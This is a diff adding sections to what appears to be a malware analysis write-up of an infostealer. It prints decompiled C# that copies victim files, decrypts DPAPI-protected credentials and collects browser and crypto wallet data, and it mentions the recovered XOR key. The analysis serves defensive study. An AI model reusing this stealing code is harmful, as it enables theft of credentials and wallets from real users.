@@ -264,13 +264,84 @@ We now have the XOR key "LenKQVy4Bh10vp2vt9AE" and can decrypt the assmebly.
 
 <img width="1213" alt="image" src="https://github.com/user-attachments/assets/80a090b0-0a0d-4ec7-8983-d51cfebbb967" />
 
+The assembly is pretty obfuscated but the following methods contain information stealing capabilities:
 
+This method copies files from specific locations to a temporary location, reads their content, and stores them in an internal memory stream. It is used repeatedly across the malware to steal files.
+```
+private static bool smethod_13<T>(string sourceFile, T metadata)
+{
+    Class2.Class3 classData = (Class2.Class3)((object)metadata);
+    string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Guid.NewGuid().ToString());
+    try
+    {
+        smethod_11(sourceFile);
+        File.Copy(sourceFile, tempFile, true);
+        byte[] fileBytes = File.ReadAllBytes(tempFile);
+        string targetName = classData.string_0 + sourceFile.Replace(classData.string_1, "");
+        smethod_4(1, fileBytes, fileBytes.Length, targetName);
+        classData.int_0++;
+        if (classData.bool_0)
+        {
+            smethod_10(sourceFile, WindowsIdentity.GetCurrent().Name);
+        }
+        File.Delete(tempFile);
+    }
+    catch
+    {
+    }
+    return true;
+}
+```
 
+Extracts encrypted credentials from files:
 
+```
+private static byte[] smethod_18(string path)
+{
+    byte[] decryptedData = new byte[0];
+    try
+    {
+        byte[] fileContent = File.ReadAllBytes(path);
+        string fileText = Encoding.Default.GetString(fileContent);
 
+        foreach (Match match in new Regex(...).Matches(fileText))
+        {
+            if (match.Success)
+            {
+                byte[] encryptedData = Convert.FromBase64String(match.Groups[1].Value);
+                byte[] dataToDecrypt = new byte[encryptedData.Length - 5];
+                Array.Copy(encryptedData, 5, dataToDecrypt, 0, encryptedData.Length - 5);
 
+                decryptedData = ProtectedData.Unprotect(dataToDecrypt, null, DataProtectionScope.CurrentUser);
+            }
+        }
+    }
+    catch
+    {
+    }
+    return decryptedData;
+}
+```
 
+Targets sensitive data from widely used software, including crypto wallets and browsers.
 
+```
+private static int smethod_36(string userFolder)
+{
+    string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+    Class2.Class3 dataCollector = new Class2.Class3(Path.Combine(userFolder, "BrowserData"), "Browser_", true);
+
+    smethod_0<Class2.Class3>(dataCollector.string_1, "*", smethod_13<Class2.Class3>, dataCollector, 999);
+
+    dataCollector.string_1 = Path.Combine(userFolder, "Wallets");
+    dataCollector.string_0 = "Wallet_";
+    smethod_0<Class2.Class3>(dataCollector.string_1, "*", smethod_13<Class2.Class3>, dataCollector, 999);
+    
+    ...
+    
+    return dataCollector.int_0;
+}
+```
 
 
 
